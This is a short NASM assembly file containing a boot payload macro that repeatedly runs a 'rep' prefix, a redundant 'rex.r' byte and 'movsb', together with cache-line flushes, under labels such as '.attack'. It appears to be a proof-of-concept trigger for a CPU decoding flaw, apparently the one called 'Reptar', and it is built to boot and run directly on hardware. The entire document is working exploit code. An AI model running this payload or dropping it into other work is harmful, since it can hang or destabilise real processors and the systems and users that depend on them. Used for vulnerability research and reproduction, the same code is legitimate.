%macro LONG_MODE_BOOT_PAYLOAD 0
    _start:
    xor rbx, rbx
    xor rdx, rdx
    inc r15
    .attack:
    cmp rdx, 1000000
    ja _start
    xor ecx, ecx
    lea rsi, [rsp+1]
    mov rdi, rsi
    .many_reptars:
        align 64
        ; 16 bytes
        times 4 nop ; 4 bytes
        dec rsi     ; 3 bytes
        dec rdi     ; 3 bytes
        inc rbx     ; 3 bytes
        inc rcx     ; 3 bytes
        ; 16 bytes
        clflush [rdi]    ; 3 bytes
        clflush [rsi+64] ; 4 bytes
        ;mov [rsp], rbx   ; 4 bytes
        rep              ; 1 byte
        db 0x44; rex.r   ; 1 byte
        movsb            ; 1 byte
        rep              ; 1 byte
        nop              ; 1 byte
    align 64
    inc rdx
    cmp rdx, rbx
    je .attack
    times 0x6000 nop
    jmp _start
%endmacro

%include "third_party/long_mode_boot.asm"
